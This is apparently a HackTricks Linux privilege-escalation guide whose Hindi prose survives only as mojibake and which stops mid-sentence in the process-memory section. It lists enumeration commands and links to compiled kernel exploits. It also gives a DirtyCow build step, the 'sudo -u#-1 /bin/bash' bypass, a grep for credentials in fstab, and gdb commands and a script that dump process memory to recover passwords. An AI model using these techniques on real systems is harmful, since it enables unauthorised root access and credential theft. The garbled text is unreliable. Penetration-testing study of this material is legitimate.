# Linux Privilege Escalation

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="../../.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="../../.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** ЁЯТм [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** ЁЯРж [**@hacktricks\_live**](https://twitter.com/hacktricks_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

## рд╕рд┐рд╕реНрдЯрдо рдЬрд╛рдирдХрд╛рд░реА

### OS рдЬрд╛рдирдХрд╛рд░реА

рдЪрд▓ рд░рд╣реЗ OS рдХреЗ рдмрд╛рд░реЗ рдореЗрдВ рдХреБрдЫ рдЬреНрдЮрд╛рди рдкреНрд░рд╛рдкреНрдд рдХрд░рдирд╛ рд╢реБрд░реВ рдХрд░рддреЗ рд╣реИрдВ
```bash
(cat /proc/version || uname -a ) 2>/dev/null
lsb_release -a 2>/dev/null # old, not by default on many systems
cat /etc/os-release 2>/dev/null # universal on modern systems
```
### Path

рдпрджрд┐ рдЖрдкрдХреЗ рдкрд╛рд╕ `PATH` рд╡реЗрд░рд┐рдПрдмрд▓ рдХреЗ рдЕрдВрджрд░ рдХрд┐рд╕реА рднреА рдлрд╝реЛрд▓реНрдбрд░ рдкрд░ рд▓рд┐рдЦрдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рд╣реИ, рддреЛ рдЖрдк рдХреБрдЫ рд▓рд╛рдЗрдмреНрд░реЗрд░реА рдпрд╛ рдмрд╛рдЗрдирд░реА рдХреЛ рд╣рд╛рдИрдЬреИрдХ рдХрд░рдиреЗ рдореЗрдВ рд╕рдХреНрд╖рдо рд╣реЛ рд╕рдХрддреЗ рд╣реИрдВ:
```bash
echo $PATH
```
### Env info

рджрд┐рд▓рдЪрд╕реНрдк рдЬрд╛рдирдХрд╛рд░реА, рдкрд╛рд╕рд╡рд░реНрдб рдпрд╛ API рдХреБрдВрдЬреА рдХреНрдпрд╛ рдкрд░реНрдпрд╛рд╡рд░рдг рдЪрд░ рдореЗрдВ рд╣реИрдВ?
```bash
(env || set) 2>/dev/null
```
### Kernel exploits

рдХрд░реНрдиреЗрд▓ рд╕рдВрд╕реНрдХрд░рдг рдХреА рдЬрд╛рдВрдЪ рдХрд░реЗрдВ рдФрд░ рдпрджрд┐ рдХреЛрдИ рдРрд╕рд╛ рдПрдХреНрд╕рдкреНрд▓реЙрдЗрдЯ рд╣реИ рдЬрд┐рд╕рдХрд╛ рдЙрдкрдпреЛрдЧ рд╡рд┐рд╢реЗрд╖рд╛рдзрд┐рдХрд╛рд░ рдмрдврд╝рд╛рдиреЗ рдХреЗ рд▓рд┐рдП рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ
```bash
cat /proc/version
uname -a
searchsploit "Linux Kernel"
```
рдЖрдк рдПрдХ рдЕрдЪреНрдЫрд╛ рдХрдордЬреЛрд░ рдХрд░реНрдиреЗрд▓ рд╕реВрдЪреА рдФрд░ рдХреБрдЫ рдкрд╣рд▓реЗ рд╕реЗ **compiled exploits** рдпрд╣рд╛рдБ рдкрд╛ рд╕рдХрддреЗ рд╣реИрдВ: [https://github.com/lucyoa/kernel-exploits](https://github.com/lucyoa/kernel-exploits) рдФрд░ [exploitdb sploits](https://github.com/offensive-security/exploitdb-bin-sploits/tree/master/bin-sploits).\
рдЕрдиреНрдп рд╕рд╛рдЗрдЯреЗрдВ рдЬрд╣рд╛рдБ рдЖрдк рдХреБрдЫ **compiled exploits** рдкрд╛ рд╕рдХрддреЗ рд╣реИрдВ: [https://github.com/bwbwbwbw/linux-exploit-binaries](https://github.com/bwbwbwbw/linux-exploit-binaries), [https://github.com/Kabot/Unix-Privilege-Escalation-Exploits-Pack](https://github.com/Kabot/Unix-Privilege-Escalation-Exploits-Pack)

рдЙрд╕ рд╡реЗрдм рд╕реЗ рд╕рднреА рдХрдордЬреЛрд░ рдХрд░реНрдиреЗрд▓ рд╕рдВрд╕реНрдХрд░рдгреЛрдВ рдХреЛ рдирд┐рдХрд╛рд▓рдиреЗ рдХреЗ рд▓рд┐рдП рдЖрдк рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ:
```bash
curl https://raw.githubusercontent.com/lucyoa/kernel-exploits/master/README.md 2>/dev/null | grep "Kernels: " | cut -d ":" -f 2 | cut -d "<" -f 1 | tr -d "," | tr ' ' '\n' | grep -v "^\d\.\d$" | sort -u -r | tr '\n' ' '
```
Kernel exploits рдЦреЛрдЬрдиреЗ рдореЗрдВ рдорджрдж рдХрд░рдиреЗ рд╡рд╛рд▓реЗ рдЙрдкрдХрд░рдг рд╣реИрдВ:

[linux-exploit-suggester.sh](https://github.com/mzet-/linux-exploit-suggester)\
[linux-exploit-suggester2.pl](https://github.com/jondonas/linux-exploit-suggester-2)\
[linuxprivchecker.py](http://www.securitysift.com/download/linuxprivchecker.py) (рд╢рд┐рдХрд╛рд░ рдкрд░ рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХрд░реЗрдВ, рдХреЗрд╡рд▓ kernel 2.x рдХреЗ рд▓рд┐рдП exploits рдХреА рдЬрд╛рдВрдЪ рдХрд░рддрд╛ рд╣реИ)

рд╣рдореЗрд╢рд╛ **Google рдореЗрдВ kernel рд╕рдВрд╕реНрдХрд░рдг рдЦреЛрдЬреЗрдВ**, рд╢рд╛рдпрдж рдЖрдкрдХрд╛ kernel рд╕рдВрд╕реНрдХрд░рдг рдХрд┐рд╕реА kernel exploit рдореЗрдВ рд▓рд┐рдЦрд╛ рд╣реЛ рдФрд░ рдлрд┐рд░ рдЖрдк рд╕реБрдирд┐рд╢реНрдЪрд┐рдд рд╣реЛрдВрдЧреЗ рдХрд┐ рдпрд╣ exploit рдорд╛рдиреНрдп рд╣реИред

### CVE-2016-5195 (DirtyCow)

Linux Privilege Escalation - Linux Kernel <= 3.19.0-73.8
```bash
# make dirtycow stable
echo 0 > /proc/sys/vm/dirty_writeback_centisecs
g++ -Wall -pedantic -O2 -std=c++11 -pthread -o dcow 40847.cpp -lutil
https://github.com/dirtycow/dirtycow.github.io/wiki/PoCs
https://github.com/evait-security/ClickNRoot/blob/master/1/exploit.c
```
### Sudo рд╕рдВрд╕реНрдХрд░рдг

рдЬреЛ рдХрдордЬреЛрд░ sudo рд╕рдВрд╕реНрдХрд░рдгреЛрдВ рдкрд░ рдЖрдзрд╛рд░рд┐рдд рд╣реИ рдЬреЛ рдкреНрд░рдХрдЯ рд╣реЛрддреЗ рд╣реИрдВ:
```bash
searchsploit sudo
```
рдЖрдк рдЗрд╕ grep рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдЬрд╛рдВрдЪ рд╕рдХрддреЗ рд╣реИрдВ рдХрд┐ sudo рд╕рдВрд╕реНрдХрд░рдг рдХрдордЬреЛрд░ рд╣реИ рдпрд╛ рдирд╣реАрдВред
```bash
sudo -V | grep "Sudo ver" | grep "1\.[01234567]\.[0-9]\+\|1\.8\.1[0-9]\*\|1\.8\.2[01234567]"
```
#### sudo < v1.28

From @sickrov
```
sudo -u#-1 /bin/bash
```
### Dmesg рд╕рд┐рдЧреНрдиреЗрдЪрд░ рд╕рддреНрдпрд╛рдкрди рд╡рд┐рдлрд▓

**HTB рдХреЗ smasher2 рдмреЙрдХреНрд╕** рдХреА рдЬрд╛рдВрдЪ рдХрд░реЗрдВ рдХрд┐ рдЗрд╕ **рдХрдордЬреЛрд░реА** рдХрд╛ рдХреИрд╕реЗ рд╢реЛрд╖рдг рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИред
```bash
dmesg 2>/dev/null | grep "signature"
```
### рдЕрдзрд┐рдХ рд╕рд┐рд╕реНрдЯрдо рдПрдиреНрдпреВрдорд░реЗрд╢рди
```bash
date 2>/dev/null #Date
(df -h || lsblk) #System stats
lscpu #CPU info
lpstat -a 2>/dev/null #Printers info
```
## рд╕рдВрднрд╛рд╡рд┐рдд рд╕реБрд░рдХреНрд╖рд╛ рдЙрдкрд╛рдпреЛрдВ рдХреА рдЧрдгрдирд╛ рдХрд░реЗрдВ

### AppArmor
```bash
if [ `which aa-status 2>/dev/null` ]; then
aa-status
elif [ `which apparmor_status 2>/dev/null` ]; then
apparmor_status
elif [ `ls -d /etc/apparmor* 2>/dev/null` ]; then
ls -d /etc/apparmor*
else
echo "Not found AppArmor"
fi
```
### рдЧреНрд░рд╕рд┐рдХреНрдпреЛрд░рд┐рдЯреА
```bash
((uname -r | grep "\-grsec" >/dev/null 2>&1 || grep "grsecurity" /etc/sysctl.conf >/dev/null 2>&1) && echo "Yes" || echo "Not found grsecurity")
```
### PaX
```bash
(which paxctl-ng paxctl >/dev/null 2>&1 && echo "Yes" || echo "Not found PaX")
```
### Execshield
```bash
(grep "exec-shield" /etc/sysctl.conf || echo "Not found Execshield")
```
### SElinux
```bash
(sestatus 2>/dev/null || echo "Not found sestatus")
```
### ASLR

ASLR (Address Space Layout Randomization) рдПрдХ рд╕реБрд░рдХреНрд╖рд╛ рддрдХрдиреАрдХ рд╣реИ рдЬреЛ рдкреНрд░реЛрдЧреНрд░рд╛рдо рдХреЗ рдореЗрдореЛрд░реА рдкрддреЗ рдХреЛ рдпрд╛рджреГрдЪреНрдЫрд┐рдХ рдмрдирд╛рдХрд░ рд╣рдорд▓реЛрдВ рдХреЛ рд░реЛрдХрдиреЗ рдореЗрдВ рдорджрдж рдХрд░рддреА рд╣реИред рдпрд╣ рд╕реБрдирд┐рд╢реНрдЪрд┐рдд рдХрд░рддрд╛ рд╣реИ рдХрд┐ рд╣рдорд▓рд╛рд╡рд░ рдХреЛ рдкреНрд░реЛрдЧреНрд░рд╛рдо рдХреЗ рдореЗрдореЛрд░реА рд╕реНрдерд╛рди рдХрд╛ рдкрддрд╛ рд▓рдЧрд╛рдирд╛ рдХрдард┐рди рд╣реЛ рдЬрд╛рдПред
```bash
cat /proc/sys/kernel/randomize_va_space 2>/dev/null
#If 0, not enabled
```
## Docker Breakout

рдпрджрд┐ рдЖрдк рдПрдХ рдбреЙрдХрд░ рдХрдВрдЯреЗрдирд░ рдХреЗ рдЕрдВрджрд░ рд╣реИрдВ, рддреЛ рдЖрдк рдЗрд╕рд╕реЗ рднрд╛рдЧрдиреЗ рдХреА рдХреЛрд╢рд┐рд╢ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ:

{% content-ref url="docker-security/" %}
[docker-security](docker-security/)
{% endcontent-ref %}

## Drives

рдЬрд╛рдВрдЪреЗрдВ **рдХреНрдпрд╛ рдорд╛рдЙрдВрдЯреЗрдб рдФрд░ рдЕрдирдорд╛рдЙрдВрдЯреЗрдб рд╣реИ**, рдХрд╣рд╛рдБ рдФрд░ рдХреНрдпреЛрдВред рдпрджрд┐ рдХреБрдЫ рдЕрдирдорд╛рдЙрдВрдЯреЗрдб рд╣реИ, рддреЛ рдЖрдк рдЗрд╕реЗ рдорд╛рдЙрдВрдЯ рдХрд░рдиреЗ рдФрд░ рдирд┐рдЬреА рдЬрд╛рдирдХрд╛рд░реА рдХреА рдЬрд╛рдВрдЪ рдХрд░рдиреЗ рдХреА рдХреЛрд╢рд┐рд╢ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред
```bash
ls /dev 2>/dev/null | grep -i "sd"
cat /etc/fstab 2>/dev/null | grep -v "^#" | grep -Pv "\W*\#" 2>/dev/null
#Check if credentials in fstab
grep -E "(user|username|login|pass|password|pw|credentials)[=:]" /etc/fstab /etc/mtab 2>/dev/null
```
## рдЙрдкрдпреЛрдЧреА рд╕реЙрдлрд╝реНрдЯрд╡реЗрдпрд░

рдЙрдкрдпреЛрдЧреА рдмрд╛рдЗрдирд░реАрдЬрд╝ рдХреА рдЧрдгрдирд╛ рдХрд░реЗрдВ
```bash
which nmap aws nc ncat netcat nc.traditional wget curl ping gcc g++ make gdb base64 socat python python2 python3 python2.7 python2.6 python3.6 python3.7 perl php ruby xterm doas sudo fetch docker lxc ctr runc rkt kubectl 2>/dev/null
```
Also, check if **рдХреЛрдИ рднреА рдХрдВрдкрд╛рдЗрд▓рд░ рд╕реНрдерд╛рдкрд┐рдд рд╣реИ**. рдпрд╣ рдЙрдкрдпреЛрдЧреА рд╣реИ рдпрджрд┐ рдЖрдкрдХреЛ рдХреБрдЫ рдХрд░реНрдиреЗрд▓ рдПрдХреНрд╕рдкреНрд▓реЙрдЗрдЯ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдиреЗ рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рд╣реИ рдХреНрдпреЛрдВрдХрд┐ рдЗрд╕реЗ рдЙрд╕ рдорд╢реАрди рдкрд░ рд╕рдВрдХрд▓рд┐рдд рдХрд░рдиреЗ рдХреА рд╕рд┐рдлрд╛рд░рд┐рд╢ рдХреА рдЬрд╛рддреА рд╣реИ рдЬрд╣рд╛рдБ рдЖрдк рдЗрд╕рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдиреЗ рдЬрд╛ рд░рд╣реЗ рд╣реИрдВ (рдпрд╛ рдПрдХ рд╕рдорд╛рди рдорд╢реАрди рдкрд░)
```bash
(dpkg --list 2>/dev/null | grep "compiler" | grep -v "decompiler\|lib" 2>/dev/null || yum list installed 'gcc*' 2>/dev/null | grep gcc 2>/dev/null; which gcc g++ 2>/dev/null || locate -r "/gcc[0-9\.-]\+$" 2>/dev/null | grep -v "/doc/")
```
### Vulnerable Software Installed

**рд╕реНрдерд╛рдкрд┐рдд рдкреИрдХреЗрдЬ рдФрд░ рд╕реЗрд╡рд╛рдУрдВ рдХреЗ рд╕рдВрд╕реНрдХрд░рдг** рдХреА рдЬрд╛рдВрдЪ рдХрд░реЗрдВред рд╢рд╛рдпрдж рдХреБрдЫ рдкреБрд░рд╛рдирд╛ Nagios рд╕рдВрд╕реНрдХрд░рдг (рдЙрджрд╛рд╣рд░рдг рдХреЗ рд▓рд┐рдП) рд╣реИ рдЬрд┐рд╕реЗ рд╡рд┐рд╢реЗрд╖рд╛рдзрд┐рдХрд╛рд░ рдмрдврд╝рд╛рдиреЗ рдХреЗ рд▓рд┐рдП рд╢реЛрд╖рдг рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ...\
рдпрд╣ рдЕрдиреБрд╢рдВрд╕рд╛ рдХреА рдЬрд╛рддреА рд╣реИ рдХрд┐ рдЕрдзрд┐рдХ рд╕рдВрджрд┐рдЧреНрдз рд╕реНрдерд╛рдкрд┐рдд рд╕реЙрдлрд╝реНрдЯрд╡реЗрдпрд░ рдХреЗ рд╕рдВрд╕реНрдХрд░рдг рдХреА рдореИрдиреНрдпреБрдЕрд▓ рд░реВрдк рд╕реЗ рдЬрд╛рдВрдЪ рдХрд░реЗрдВред
```bash
dpkg -l #Debian
rpm -qa #Centos
```
рдпрджрд┐ рдЖрдкрдХреЗ рдкрд╛рд╕ рдорд╢реАрди рддрдХ SSH рдкрд╣реБрдВрдЪ рд╣реИ, рддреЛ рдЖрдк **openVAS** рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдорд╢реАрди рдХреЗ рдЕрдВрджрд░ рд╕реНрдерд╛рдкрд┐рдд рдкреБрд░рд╛рдиреЗ рдФрд░ рдХрдордЬреЛрд░ рд╕реЙрдлрд╝реНрдЯрд╡реЗрдпрд░ рдХреА рдЬрд╛рдВрдЪ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред

{% hint style="info" %}
_рдзреНрдпрд╛рди рджреЗрдВ рдХрд┐ рдпреЗ рдХрдорд╛рдВрдб рдмрд╣реБрдд рд╕рд╛рд░реА рдЬрд╛рдирдХрд╛рд░реА рджрд┐рдЦрд╛рдПрдВрдЧреЗ рдЬреЛ рдЬреНрдпрд╛рджрд╛рддрд░ рдмреЗрдХрд╛рд░ рд╣реЛрдЧреА, рдЗрд╕рд▓рд┐рдП рдХреБрдЫ рдПрдкреНрд▓рд┐рдХреЗрд╢рди рдЬреИрд╕реЗ OpenVAS рдпрд╛ рд╕рдорд╛рди рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдиреЗ рдХреА рд╕рд┐рдлрд╛рд░рд┐рд╢ рдХреА рдЬрд╛рддреА рд╣реИ рдЬреЛ рдЬрд╛рдВрдЪреЗрдВрдЧреЗ рдХрд┐ рдХреНрдпрд╛ рдХреЛрдИ рд╕реНрдерд╛рдкрд┐рдд рд╕реЙрдлрд╝реНрдЯрд╡реЗрдпрд░ рд╕рдВрд╕реНрдХрд░рдг рдЬреНрдЮрд╛рдд рд╢реЛрд╖рдгреЛрдВ рдХреЗ рд▓рд┐рдП рдХрдордЬреЛрд░ рд╣реИ_
{% endhint %}

## рдкреНрд░рдХреНрд░рд┐рдпрд╛рдПрдБ

рджреЗрдЦреЗрдВ рдХрд┐ **рдХреМрди рд╕реА рдкреНрд░рдХреНрд░рд┐рдпрд╛рдПрдБ** рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХреА рдЬрд╛ рд░рд╣реА рд╣реИрдВ рдФрд░ рдЬрд╛рдВрдЪреЗрдВ рдХрд┐ рдХреНрдпрд╛ рдХреЛрдИ рдкреНрд░рдХреНрд░рд┐рдпрд╛ **рдЙрд╕рд╕реЗ рдЕрдзрд┐рдХ рд╡рд┐рд╢реЗрд╖рд╛рдзрд┐рдХрд╛рд░ рд░рдЦрддреА рд╣реИ рдЬрд┐рддрдиреА рдЙрд╕реЗ рд╣реЛрдиреА рдЪрд╛рд╣рд┐рдП** (рд╢рд╛рдпрдж рдПрдХ рдЯреЙрдордХреИрдЯ рдЬрд┐рд╕реЗ рд░реВрдЯ рджреНрд╡рд╛рд░рд╛ рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХрд┐рдпрд╛ рдЬрд╛ рд░рд╣рд╛ рд╣реИ?)
```bash
ps aux
ps -ef
top -n 1
```
рд╣рдореЗрд╢рд╛ рд╕рдВрднрд╛рд╡рд┐рдд [**electron/cef/chromium debuggers** рдЪрд▓ рд░рд╣реЗ рд╣реИрдВ, рдЖрдк рдЗрд╕рдХрд╛ рджреБрд░реБрдкрдпреЛрдЧ рдХрд░рдХреЗ рд╡рд┐рд╢реЗрд╖рд╛рдзрд┐рдХрд╛рд░ рдмрдврд╝рд╛ рд╕рдХрддреЗ рд╣реИрдВ](electron-cef-chromium-debugger-abuse.md)ред **Linpeas** рдЗрдиреНрд╣реЗрдВ рдкреНрд░рдХреНрд░рд┐рдпрд╛ рдХреА рдХрдорд╛рдВрдб рд▓рд╛рдЗрди рдореЗрдВ `--inspect` рдкреИрд░рд╛рдореАрдЯрд░ рдХреА рдЬрд╛рдВрдЪ рдХрд░рдХреЗ рдкрд╣рдЪрд╛рдирддреЗ рд╣реИрдВред\
рд╕рд╛рде рд╣реА **рдкреНрд░рдХреНрд░рд┐рдпрд╛рдУрдВ рдХреЗ рдмрд╛рдЗрдирд░реА рдкрд░ рдЕрдкрдиреЗ рд╡рд┐рд╢реЗрд╖рд╛рдзрд┐рдХрд╛рд░реЛрдВ рдХреА рдЬрд╛рдВрдЪ рдХрд░реЗрдВ**, рд╢рд╛рдпрдж рдЖрдк рдХрд┐рд╕реА рдФрд░ рдХреЛ рдУрд╡рд░рд░рд╛рдЗрдЯ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред

### рдкреНрд░рдХреНрд░рд┐рдпрд╛ рдирд┐рдЧрд░рд╛рдиреА

рдЖрдк рдкреНрд░рдХреНрд░рд┐рдпрд╛рдУрдВ рдХреА рдирд┐рдЧрд░рд╛рдиреА рдХреЗ рд▓рд┐рдП [**pspy**](https://github.com/DominicBreuker/pspy) рдЬреИрд╕реЗ рдЙрдкрдХрд░рдгреЛрдВ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред рдпрд╣ рдЕрдХреНрд╕рд░ рдЪрд▓ рд░рд╣реА рдХрдордЬреЛрд░ рдкреНрд░рдХреНрд░рд┐рдпрд╛рдУрдВ рдХреА рдкрд╣рдЪрд╛рди рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдмрд╣реБрдд рдЙрдкрдпреЛрдЧреА рд╣реЛ рд╕рдХрддрд╛ рд╣реИ рдпрд╛ рдЬрдм рдЖрд╡рд╢реНрдпрдХрддрд╛рдУрдВ рдХрд╛ рдПрдХ рд╕реЗрдЯ рдкреВрд░рд╛ рд╣реЛрддрд╛ рд╣реИред

### рдкреНрд░рдХреНрд░рд┐рдпрд╛ рдореЗрдореЛрд░реА

рдХреБрдЫ рд╕рд░реНрд╡рд░ рдХреА рд╕реЗрд╡рд╛рдПрдБ **рдореЗрдореЛрд░реА рдХреЗ рдЕрдВрджрд░ рд╕реНрдкрд╖реНрдЯ рдкрд╛рда рдореЗрдВ рдХреНрд░реЗрдбреЗрдВрд╢рд┐рдпрд▓реНрд╕ рдХреЛ рд╕рд╣реЗрдЬрддреА рд╣реИрдВ**ред\
рд╕рд╛рдорд╛рдиреНрдпрддрдГ, рдЖрдкрдХреЛ рдЕрдиреНрдп рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛рдУрдВ рд╕реЗ рд╕рдВрдмрдВрдзрд┐рдд рдкреНрд░рдХреНрд░рд┐рдпрд╛рдУрдВ рдХреА рдореЗрдореЛрд░реА рдкрдврд╝рдиреЗ рдХреЗ рд▓рд┐рдП **рд░реВрдЯ рд╡рд┐рд╢реЗрд╖рд╛рдзрд┐рдХрд╛рд░** рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рд╣реЛрдЧреА, рдЗрд╕рд▓рд┐рдП рдпрд╣ рдЖрдорддреМрд░ рдкрд░ рддрдм рдЕрдзрд┐рдХ рдЙрдкрдпреЛрдЧреА рд╣реЛрддрд╛ рд╣реИ рдЬрдм рдЖрдк рдкрд╣рд▓реЗ рд╕реЗ рд╣реА рд░реВрдЯ рд╣реИрдВ рдФрд░ рдЕрдзрд┐рдХ рдХреНрд░реЗрдбреЗрдВрд╢рд┐рдпрд▓реНрд╕ рдЦреЛрдЬрдиреЗ рдХреА рдХреЛрд╢рд┐рд╢ рдХрд░ рд░рд╣реЗ рд╣реИрдВред\
рд╣рд╛рд▓рд╛рдВрдХрд┐, рдпрд╛рдж рд░рдЦреЗрдВ рдХрд┐ **рдПрдХ рдирд┐рдпрдорд┐рдд рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреЗ рд░реВрдк рдореЗрдВ рдЖрдк рдЕрдкрдиреА рдкреНрд░рдХреНрд░рд┐рдпрд╛рдУрдВ рдХреА рдореЗрдореЛрд░реА рдкрдврд╝ рд╕рдХрддреЗ рд╣реИрдВ**ред

{% hint style="warning" %}
рдзреНрдпрд╛рди рджреЗрдВ рдХрд┐ рдЖрдЬрдХрд▓ рдЕрдзрд┐рдХрд╛рдВрд╢ рдорд╢реАрдиреЗрдВ **рдбрд┐рдлрд╝реЙрд▓реНрдЯ рд░реВрдк рд╕реЗ ptrace рдХреА рдЕрдиреБрдорддрд┐ рдирд╣реАрдВ рджреЗрддреАрдВ** рдЬрд┐рд╕рдХрд╛ рдЕрд░реНрде рд╣реИ рдХрд┐ рдЖрдк рдЕрдкрдиреЗ рд╡рд┐рд╢реЗрд╖рд╛рдзрд┐рдХрд╛рд░рд╣реАрди рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рд╕реЗ рд╕рдВрдмрдВрдзрд┐рдд рдЕрдиреНрдп рдкреНрд░рдХреНрд░рд┐рдпрд╛рдУрдВ рдХреЛ рдбрдВрдк рдирд╣реАрдВ рдХрд░ рд╕рдХрддреЗред

рдлрд╛рдЗрд▓ _**/proc/sys/kernel/yama/ptrace\_scope**_ ptrace рдХреА рдкрд╣реБрдВрдЪ рдХреЛ рдирд┐рдпрдВрддреНрд░рд┐рдд рдХрд░рддреА рд╣реИ:

* **kernel.yama.ptrace\_scope = 0**: рд╕рднреА рдкреНрд░рдХреНрд░рд┐рдпрд╛рдУрдВ рдХреЛ рдбрд┐рдмрдЧ рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ, рдЬрдм рддрдХ рдХрд┐ рдЙрдирдХреЗ рдкрд╛рд╕ рд╕рдорд╛рди uid рд╣реЛред рдпрд╣ ptracing рдХреЗ рдХрд╛рдо рдХрд░рдиреЗ рдХрд╛ рдкрд╛рд░рдВрдкрд░рд┐рдХ рддрд░реАрдХрд╛ рд╣реИред
* **kernel.yama.ptrace\_scope = 1**: рдХреЗрд╡рд▓ рдПрдХ рдорд╛рддрд╛-рдкрд┐рддрд╛ рдкреНрд░рдХреНрд░рд┐рдпрд╛ рдХреЛ рдбрд┐рдмрдЧ рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИред
* **kernel.yama.ptrace\_scope = 2**: рдХреЗрд╡рд▓ рд╡реНрдпрд╡рд╕реНрдерд╛рдкрдХ ptrace рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░ рд╕рдХрддрд╛ рд╣реИ, рдХреНрдпреЛрдВрдХрд┐ рдпрд╣ CAP\_SYS\_PTRACE рдХреНрд╖рдорддрд╛ рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рд╣реЛрддреА рд╣реИред
* **kernel.yama.ptrace\_scope = 3**: рдХреЛрдИ рдкреНрд░рдХреНрд░рд┐рдпрд╛рдПрдБ ptrace рдХреЗ рд╕рд╛рде рдЯреНрд░реЗрд╕ рдирд╣реАрдВ рдХреА рдЬрд╛ рд╕рдХрддреАрдВред рдПрдХ рдмрд╛рд░ рд╕реЗрдЯ рд╣реЛрдиреЗ рдкрд░, ptracing рдХреЛ рдлрд┐рд░ рд╕реЗ рд╕рдХреНрд╖рдо рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдПрдХ рд░рд┐рдмреВрдЯ рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рд╣реЛрддреА рд╣реИред
{% endhint %}

#### GDB

рдпрджрд┐ рдЖрдкрдХреЗ рдкрд╛рд╕ рдПрдХ FTP рд╕реЗрд╡рд╛ (рдЙрджрд╛рд╣рд░рдг рдХреЗ рд▓рд┐рдП) рдХреА рдореЗрдореЛрд░реА рддрдХ рдкрд╣реБрдВрдЪ рд╣реИ, рддреЛ рдЖрдк Heap рдкреНрд░рд╛рдкреНрдд рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ рдФрд░ рдЗрд╕рдХреЗ рдХреНрд░реЗрдбреЗрдВрд╢рд┐рдпрд▓реНрд╕ рдХреЗ рдЕрдВрджрд░ рдЦреЛрдЬ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред
```bash
gdb -p <FTP_PROCESS_PID>
(gdb) info proc mappings
(gdb) q
(gdb) dump memory /tmp/mem_ftp <START_HEAD> <END_HEAD>
(gdb) q
strings /tmp/mem_ftp #User and password
```
#### GDB рд╕реНрдХреНрд░рд┐рдкреНрдЯ

{% code title="dump-memory.sh" %}
```bash
#!/bin/bash
#./dump-memory.sh <PID>
grep rw-p /proc/$1/maps \
| sed -n 's/^\([0-9a-f]*\)-\([0-9a-f]*\) .*$/\1 \2/p' \
| while read start stop; do \
gdb --batch --pid $1 -ex \
"dump memory $1-$start-$stop.dump 0x$start 0x$stop"; \
done
```
{% endcode %}

#### /proc/$pid/maps & /proc/$pid/mem

рдХрд┐рд╕реА рджрд┐рдП рдЧрдП рдкреНрд░рдХреНрд░рд┐рдпрд╛ рдЖрдИрдбреА рдХреЗ рд▓рд┐рдП, **рдореИрдкреНрд╕ рджрд┐рдЦрд╛рддреЗ рд╣реИрдВ рдХрд┐ рдореЗрдореЛрд░реА рдЙрд╕ рдкреНрд░рдХреНрд░рд┐рдпрд╛ рдХреЗ** рд╡рд░реНрдЪреБрдЕрд▓ рдПрдбреНрд░реЗрд╕ рд╕реНрдкреЗрд╕ рдХреЗ рднреАрддрд░ рдХреИрд╕реЗ рдореИрдк рдХреА рдЧрдИ рд╣реИ; рдпрд╣ **рдкреНрд░рддреНрдпреЗрдХ рдореИрдк рдХреА рдЧрдИ рдХреНрд╖реЗрддреНрд░ рдХреЗ рдЕрдиреБрдорддрд┐рдпреЛрдВ** рдХреЛ рднреА рджрд┐рдЦрд╛рддрд╛ рд╣реИред **рдореЗрдо** рдкреНрд╕реЗUDO рдлрд╝рд╛рдЗрд▓ **рдкреНрд░рдХреНрд░рд┐рдпрд╛рдУрдВ рдХреА рдореЗрдореЛрд░реА рдХреЛ рд╕реНрд╡рдпрдВ рдЙрдЬрд╛рдЧрд░ рдХрд░рддреА рд╣реИ**ред **рдореИрдкреНрд╕** рдлрд╝рд╛рдЗрд▓ рд╕реЗ рд╣рдореЗрдВ рдкрддрд╛ рдЪрд▓рддрд╛ рд╣реИ рдХрд┐ **рдХреМрди рд╕реА рдореЗрдореЛрд░реА рдХреНрд╖реЗрддреНрд░ рдкрдврд╝рдиреЗ рдпреЛрдЧреНрдп рд╣реИрдВ** рдФрд░ рдЙрдирдХреЗ рдСрдлрд╕реЗрдЯред рд╣рдо рдЗрд╕ 